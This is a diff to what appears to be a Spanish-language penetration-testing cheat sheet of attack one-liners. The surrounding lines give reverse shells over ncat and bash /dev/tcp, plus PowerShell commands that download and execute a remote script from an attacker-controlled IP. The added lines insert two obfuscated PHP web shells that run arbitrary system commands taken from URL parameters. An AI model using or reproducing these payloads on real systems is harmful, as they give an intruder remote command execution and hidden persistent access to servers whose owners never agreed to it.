@@ -57,6 +57,24 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
     0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
     exec 5<>/dev/tcp/IP/PUERTO cat <&5 | while read line; do $line 2>&5 >&5; done&		(el & final la pone en background)
 
+*shell.php?0=system&1=ls*
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+
+*shell.php?_=system&__=ls*
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+
 	**WINDOWS:**
 		powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
 		powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"
